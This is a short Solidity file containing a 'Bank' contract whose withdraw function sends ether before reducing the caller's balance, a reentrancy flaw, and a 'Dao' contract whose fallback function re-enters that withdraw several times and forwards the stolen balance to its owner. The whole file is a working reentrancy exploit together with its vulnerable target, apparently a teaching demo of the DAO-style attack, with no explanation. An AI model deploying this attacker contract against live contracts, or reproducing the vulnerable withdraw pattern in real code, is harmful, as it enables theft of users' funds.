pragma solidity ^0.4.19;

contract Bank {
   mapping(address => uint256) public clients;
   uint256 public ethBalance;

    function deposit() public payable {
        clients[msg.sender] = msg.value + clients[msg.sender];
        ethBalance = ethBalance + msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= clients[msg.sender]);
        msg.sender.call.value(amount)();
        ethBalance = ethBalance - amount;
        clients[msg.sender] = clients[msg.sender] - amount;
    }  
}

contract Dao {
    Bank public bank;
    uint public count = 0;
    address public owner;
    
    constructor(address _a) public {
        owner = msg.sender;
        bank = Bank(_a);
    }
    
    function() public payable {
        if (count !=3) {
            count++;
            bank.withdraw(1 ether);
        }
    }
    
    function deposit() public payable {
        bank.deposit.value(msg.value)();
    }
    
    function withdraw(uint256 _amount) public {
        bank.withdraw(_amount);
        owner.transfer(this.balance);
    }
}
